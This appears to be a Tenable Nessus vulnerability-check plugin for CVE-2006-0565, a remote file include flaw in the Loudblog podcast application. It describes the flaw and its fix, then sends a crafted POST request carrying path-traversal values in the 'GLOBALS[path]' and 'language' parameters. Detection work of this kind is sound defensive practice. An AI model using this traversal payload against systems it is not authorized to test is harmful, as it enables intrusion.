#
# (C) Tenable Network Security
#


if (description) {
  script_id(20861);
  script_version("$Revision: 1.5 $");

  script_cve_id("CVE-2006-0565");
  script_bugtraq_id(16495);
  if (defined_func("script_xref")) script_xref(name:"OSVDB", value:"22921");

  script_name(english:"Loudblog backend_settings.php Remote File Include Vulnerability");
  script_summary(english:"Checks for remote file include vulnerability in Loudblog's backend_settings.php");
 
  desc = "
Synopsis :

The remote web server contains a PHP script that is prone to a remote
file include vulnerability. 

Description :

The remote host is running Loudblog, a PHP application for publishing
podcasts and similar media files. 

The installed version of Loudblog fails to validate user input to the
'GLOBALS[path]' and 'language' parameters before using them in the
'loudblog/inc/backend_settings.php' script in a PHP 'include'
function.  Provide PHP's 'register_globals' setting is enabled, an
unauthenticated attacker can exploit this flaw to run arbitrary code,
possibly taken from third-party hosts, subject to the privileges of
the web server user id. 

See also :

http://www.securityfocus.com/archive/1/423947/30/0/threaded
http://loudblog.de/forum/viewtopic.php?id=576

Solution : 

Upgrade to Loudblog 0.41 or later.

Risk factor : 

Medium / CVSS Base Score : 6.9
(AV:R/AC:L/Au:NR/C:P/I:P/A:P/B:N)";
  script_description(english:desc);

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006 Tenable Network Security");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Loop through directories.
if (thorough_tests) dirs = make_list("/loudblog", "/podcast", "/podcasts", cgi_dirs());
else dirs = make_list(cgi_dirs());

foreach dir (dirs) {
  # Grab index.php.
  res = http_get_cache(item:string(dir, "/index.php"), port:port);
  if (res == NULL) exit(0);

  # If ...
  if (
    # there's a logo for Loudblog or...
    egrep(pattern:">Powered by <[^>]+>Loudblog<", string:res) ||
    # it hasn't been installed yet.
    ">Install Loudblog now!<" >< res
  ) {
    # Try to exploit the flaw to read '/loudblog/inc/id3/write.php',
    # which will die with an error message.
    postdata = string(
      "language=../inc/id3/write"
    );
    url = string(
      dir, "/loudblog/inc/backend_settings.php?",
      "GLOBALS[path]=../.."
    );
    req = string(
      "POST ", url, " HTTP/1.1\r\n",
      "Host: ", get_host_name(), "\r\n",
      "Content-Type: application/x-www-form-urlencoded\r\n",
      "Content-Length: ", strlen(postdata), "\r\n",
      "\r\n",
      postdata
    );
    res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
    if (res == NULL) exit(0);

    # There's a problem if we get a message about including getid3.php.
    if ("getid3.php MUST be included before calling" >< res) {
      security_warning(port);
      exit(0);
    }
  }
}
